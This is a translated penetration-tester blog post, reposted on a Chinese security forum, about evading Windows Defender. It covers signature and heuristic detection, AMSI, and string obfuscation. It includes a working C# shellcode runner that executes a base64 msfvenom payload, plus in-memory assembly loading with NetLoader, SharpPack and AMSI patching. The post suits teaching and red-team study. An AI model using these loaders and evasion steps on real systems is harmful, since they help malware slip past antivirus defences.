> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9620)

> 先知社区，先知安全技术社区

> 本文为翻译文章, 原文地址:[https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/#what-happens-when-stuff-is-not-on-disk](https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/#what-happens-when-stuff-is-not-on-disk)

在最近的一次渗透测试中, 我有机会通过 RDP 在 AD 环境中花费一些时间来测试他们加固。从基本技术到更高级的技术，我学到了很多关于 DotNet，防病毒引擎如何工作以及如何绕过它们的知识。我确实在渗透测试中设法绕过了 Defender，并且运行了一些不错的东西，并且想为像我这样几天前对绕过防病毒软件经验很少的的人撰写一篇博客文章。欢迎享受阅读时光:)

AV 工作原理
-------

在我们深入探讨我尝试过的解决方案之前，让我们回顾一下 AV 如何处理磁盘上的文件 (无 AI, 基本来说):

*   签名检测
*   启发式检测
*   内存检测

### 签名

最基本功能且是最早地将文件或文件一部分的哈希值与已知的恶意文件的哈希值比较。这可以是整个文件的哈希，也可以只是恶意活动核心的几个字节或者字符串的哈希。

### 启发式

当签名不足或者没有签名时，防病毒学派下一个等级是正在考虑模拟运行在实际运行之前的可执行文件。这意味着要检查汇编指令或者代码行，并检查它们在运行时会发生什么。根据观察到的行为，AV 可以确定文件是恶意的，然后禁止文件在模拟后再运行。

### 当东西不在磁盘上时会发生什么?

最后要提到的重要一件事是 AMSI: Microsoft 对恶意软件的响应甚至没有触及磁盘。当磁盘上的可执行文件运行时，会在允许运行之前对其进行扫描 / 模拟，但是如果该可执行文件已在内存中并且从其他位置加载，那么会发生什么情况? AMSI 是 Window API，允许软件开发人员执行脚本 (例如 PowerShell, office 中的 VBA 宏, C# 程序集的反射) 来请求 AMSI 扫描, 然后再运行内存中的东西。

第一种方法: 更改字符串和混淆
---------------

因此, 让我们尝试绕过 AV 的第一层: 签名检测。我的第一次尝试是通过 [DefenderCheck](https://github.com/matterpreter/DefenderCheck), [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1), 以及在 [AntiScan.me](https://antiscan.me/) 和 [VirusTotal](https://www.virustotal.com/gui/) 上进行手动扫描来运行 C# 版 SharpHound.exe 来试图找出代码中的那一部分触发了杀毒软件。通过反复试验，遍历文件越来越小的部分，你可以找出那些字符串触发了 AV 然后在 Visual Studio 中重构这些字符串，或者更改可执行文件的个别字节。最后一种方法的缺点是，当汇编指令被重写时，它很可能会破坏可执行文件，并且需要逆向工程去弄清楚更改了什么和是否能够修复，这需要花费时间和精力在反汇编的二进制代码上。这并不好，我们是懒惰的，我们不得不对每个要绕过 AV 的软件执行此操作。em...

另一种方法, 则是尝试修改代码, 以至于看起来不像任何东西了。我的意思是, 尝试去混淆源代码，诸如 [ConfuserEx 之类的](https://github.com/mkaring/ConfuserEx)工具可以针对. Net 应用程序执行此操作。这在一定程度上可行，几年前来说已经足够了，但现在依然不能绕过任何启发式检测。好吧，可以去试试。

第二种方法: 自制 C# 加载器
----------------

我的下一次尝试让我感到羞愧，但这是我尝试过的方法： 由于 WinAPI 的调用，我知道 Shellcode 运行程序可以在 C# 中执行 msfvenom 生成的有效负载。基本的加载器代码如下所示。

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.IO;

namespace Shellcode_Runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreatingFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -a x64 -f base64
            string b64_payload = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
            byte[] buf = System.Convert.FromBase64String(b64_payload);

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Thread.Sleep(10000);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

而且我很少想到, 如果我可以使用它允许 shellcode 执行, 为什么并不尝试在 base64 中加载整个 EXE 文件并像 shellcode 一样执行它。我的意思是为什么它不起作用? :D 显然, 我注意到 EXE 尤其是 C# 编译的 EXE 并不是 shellcode, 而且由于 PE 头文件的原因，显然无法加载整个 EXE 作为汇编指令执行。不要纠结 C# 实际上是怎么编译的，我记得有一段时间尝试将它作为一种托管语言并编译为中间代码... 甚至我做了使用 [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode) 将其转换为 shellcode 的努力, 这将把 PE 头修改为可执行的 (显然仍然无法与 c# 一起使用) 或 [Donut](https://github.com/TheWover/donut)(这可以起作用吗? 不知道为什么不行) 没有带来任何成果。

但是，我写了一个 shellcode 加载器! 下一步是通过对有效负载加密来逃避签名检测， 并通过打乱我们的行为来逃避启发式检测。（这可能将在另一篇博文的主题, 在没有使用我最后的解决方案主要集中于绕过 AV 对 shellcode 的查杀)。因此，到我的下一个尝试。

第三种方法: 有效负载传递
-------------

因此，如果我无法足够混淆 C# 的可执行文件， 或者无法通过将其作为 shellcode 运行来绕过启发式分析，那么也许还有另一种不接触磁盘的方法。在 CRTE 训练营之前，我曾经使用过 [NetLoader](https://github.com/Flangvik/NetLoader)，但并没有真正地去了解它的用途和作用对象，但现在让我们开始 (稍微) 深入了解下:

NetLoader 是一种 C# 工具, 可通过反射从路径, URL, 或 SMB 共享加载 C# 程序集 (该主题是另一个博客的，但可以将其视为 shellcode 加载器但是作用对象是 c# 程序集) 并通过修补 AMSI 来绕过它。这意味着恶意的 c# 可执行文件根本不需要接触磁盘，这对我们来说是一件好事，因为它绕过了 AMSI(后面文章的另一个主题), 这可能意味着完全绕过了 Defender。唯一的事情是，它将被允许执行吗？ 好吧, 显然微软没有为 NetLoader 添加签名，正因为这样才不会被阻止运行。

首次成功: 运行任何恶意的 C# 可执行文件！

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210529000346-482dd886-bfce-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210529000346-482dd886-bfce-1.png)

但这对我来说还不够，我还希望能够允许 PowerShell 脚本...... 但这在 NetLoader 上不起作用，因此转到另一个用于进行有效负载传递和 AMSI 绕过的工具 [SharpPack](https://github.com/mdsecactivebreach/SharpPack):

为了达到我的目的，SharpPack 需要进行一些重构，因为该项目默认会编译为 DLL, 这对于更安全方式而言有意义，像 [DotNetToJScript](https://github.com/tyranid/DotNetToJScript) 或者 Office VBA 宏中的方式，如[本](https://www.mdsec.co.uk/2018/12/sharppack-the-insider-threat-toolkit/)博客文章中所述，我只想要一个普通的 C＃可执行文件，然后我将其与 NetLoader 一起运行。

我将项目更改为编译 exe，并添加了一个 main:

```
using System;
using SharpPack;

namespace SharpPackRunner
{
    class Program
    {
        static void usage()
        {
            System.Console.WriteLine("Usage: SharpPackRunner.exe -D/-P <encpath> <encpass> <outfile> <name> <args>");
            return;
        }
        static void Main(string[] args)
        {
            if (args.Length != 6)
            {
                usage();
                return;
            }

            var sp = new SharpPackClass();
            if (String.Equals(args[0], "-D"))
                sp.RunDotNet(args[1], args[2], args[3], args[4], args[5]);
            else if (String.Equals(args[0], "-P"))
                sp.RunPowerShell(args[1], args[2], args[3], args[4], args[5]);
            else
                usage();
        }
    }
}
```

(我一直在寻找一种更优雅的解决方案，例如像 Python 中 * array 那样将数组解压为参数，但显然在 C# 中，如果不重构该方法，这是不可能的)

因此，最终我获得了可以与 NetLoader 一起运行的 C# 可执行文件，并且可以从加密的 zip 文件中提取出恶意的 c# 恶意代码，然后运行它，并发送输出到文本文件。可以更改代码以从 URL 或 NetLoader 之类的共享去加载可执行文件和脚本并显示输出而不是将其发送到文本文件，这样磁盘上就什么都没有了，但是说实话没有太多时间去深入研究源代码了。

我在 SharpHound.ps1 脚本的末尾添加了一行`Invoke-BloodHound -CollectionMethod All`以加载和运行 SharpHound(虽然再次阅读 MDSec 的博客文章，我可能已经将该行作为 SharpPack 的最后一个参数了)，现在可以运行 PowerShell 脚本了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210529000318-37dcacc8-bfce-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210529000318-37dcacc8-bfce-1.png)

我的任务完成了!

结论
--

我确实设法绕过了 Defender, 在此过程中我学到了很多有关防病毒软件的知识，但是我并没有深入研究绕过 AMSI 和 C# 中的反射机制，这可能是将来博客文章中的主题。我希望这篇文章是足够清晰的，如果我在解释上有任何错误，请在 issue 或 Discord(arty-hlr#1427) 告知我。